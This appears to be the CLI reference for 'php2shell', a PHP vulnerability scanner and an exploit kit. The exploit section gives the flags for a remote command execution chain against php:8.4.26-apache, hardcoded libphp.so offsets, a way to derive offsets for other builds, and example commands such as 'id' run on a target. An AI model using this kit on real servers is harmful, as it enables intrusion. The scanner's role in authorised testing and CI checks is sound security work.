# CLI reference

Both tools are zero-install: run the launcher from a checkout, or install the
scanner as a console script.

```bash
./scanner/scan --help
./exploit-kit/exploit --help
```

---

## `scan` — scanner 1.1.0

```
usage: php2shell-scan [-h] [-u URL] [-l FILE] [-t N] [--timeout SEC]
                      [--connect-timeout SEC] [--max-probe-mib N]
                      [--sapi {auto,mod_php,fpm}] [-H K:V] [-k] [-o FILE]
                      [--all-results] [-v] [-q] [--no-color] [--yes] [--ui]
                      [--port N] [--no-open] [--version]
```

### Target selection

| Flag | Default | Meaning |
|---|---|---|
| `-u`, `--url URL` | — | Target URL. Repeatable. |
| `-l`, `--list FILE` | — | File of targets, one per line. `#` comments ignored. |

Both may be combined; `-u` entries are scanned first.

### Transport

| Flag | Default | Meaning |
|---|---|---|
| `-t`, `--threads N` | 5 | Concurrent scans. Keep it low — each scan sends MiB. |
| `--timeout SEC` | 60 | Per-request timeout. Probes are large; 60 s is not generous on slow links. |
| `--connect-timeout SEC` | 10 | TCP connect timeout. |
| `--max-probe-mib N` | 20 | Largest probe body in MiB. Lower it for proxy-limited links. |
| `-H`, `--header K:V` | — | Extra request header. Repeatable. Use for auth cookies on an authorised test. |
| `-k`, `--insecure` | off | Skip TLS verification. |

### Rules

| Flag | Default | Meaning |
|---|---|---|
| `--sapi {auto,mod_php,fpm}` | `auto` | Restrict verdict rules to one server model. |

`auto` tries both rule sets and reports which one fired. Pin it when you already
know the SAPI, so a shared-hosting front end cannot produce a mixed verdict.

### Output

| Flag | Meaning |
|---|---|
| `-o`, `--output FILE` | Write JSON results to `FILE`. |
| `--all-results` | Include non-vulnerable targets in the JSON. Without it, only hits are written. |
| `-v`, `--verbose` | Per-probe detail: bytes sent, time, raw signal. |
| `-q`, `--quiet` | Print vulnerable targets only. |
| `--no-color` | Disable ANSI colour, for logs and CI. |

### Interactive

| Flag | Meaning |
|---|---|
| `--ui` | Launch the local web console. |
| `--port N` | UI port. Default: first free port. |
| `--no-open` | Do not open a browser automatically. |
| `--yes` | Skip the interactive confirmation prompt. |

The UI binds to `127.0.0.1` and requires the per-run `?token=` printed in the
terminal on every API route. It is a console for one operator on one host, not a
service — see [`../SECURITY.md`](../SECURITY.md).

### Examples

```bash
./scanner/scan -u https://target.example -v
./scanner/scan -l targets.txt -t 10 -o results.json --all-results
./scanner/scan -u https://target.example --sapi fpm --max-probe-mib 8
./scanner/scan -u https://target.example -H 'Cookie: session=…' --yes
./scanner/scan -u https://target.example --ui --no-open --port 8081
```

---

## `exploit` — exploit-kit 1.0.0

```
usage: php2shell-exploit [-h] -u URL [-c CMD] [--fetch FETCH]
                         [--zif-offset ZIF_OFFSET] [--dtor-offset DTOR_OFFSET]
                         [--htdata-offset HTDATA_OFFSET] [--huge-mb HUGE_MB]
                         [--timeout TIMEOUT] [-k] [--diagnose] [-q]
                         [--no-color] [--version]
```

| Flag | Default | Meaning |
|---|---|---|
| `-u`, `--url URL` | required | Target URL. |
| `-c`, `--cmd CMD` | — | Command to run. Max 14 bytes, set by the primitive. |
| `--fetch FETCH` | — | Path to GET afterwards, to verify output. |
| `--zif-offset` | `0x465370` | `zif_system` offset in `libphp.so` for `php:8.4.26-apache`. |
| `--dtor-offset` | `0x65EB60` | `zval_ptr_dtor` offset, same image. |
| `--htdata-offset` | image default | Chunk-relative offset of the carrier string. |
| `--huge-mb` | image default | Size of the OOM field in MiB. |
| `--timeout` | 60 | Per-request timeout. |
| `-k`, `--insecure` | off | Skip TLS verification. |
| `--diagnose` | off | Run mechanism analysis instead of the chain: explains why stage 1 fails. |
| `-q`, `--quiet` | off | Suppress progress output. |
| `--no-color` | off | Disable colours. |

### Offsets are per build

The defaults match `php:8.4.26-apache`. On any other image, derive them yourself:

```bash
nm -D /usr/local/lib/libphp.so | grep -E ' zif_system$| zval_ptr_dtor$'
```

Using another build's offsets guarantees stage 2 will not match — the low 12 bits
of the leaked destructor pointer will not line up. This is documented at length in
[`exploit-chain.md`](exploit-chain.md).

### Examples

```bash
./exploit-kit/exploit -u http://127.0.0.1:8080 --diagnose
./exploit-kit/exploit -u http://127.0.0.1:8080 -c id
./exploit-kit/exploit -u http://127.0.0.1:8080 -c 'echo pwn' --fetch /pwn.txt
./exploit-kit/exploit -u http://127.0.0.1:8080 -c id --zif-offset 0x465370 --dtor-offset 0x65EB60
```

---

## Exit codes

| Code | Meaning |
|---|---|
| 0 | Scan completed; no vulnerable target found |
| 1 | At least one target reported `VULNERABLE` |
| 2 | Usage error |
| 130 | Interrupted (`SIGINT`) |

Exit code 1 on a hit makes the scanner usable as a CI or cron gate. `INCONCLUSIVE`
does not set exit code 1 — an unbaselined target is not a hit, and treating it as
one would make the gate unusable behind a WAF.
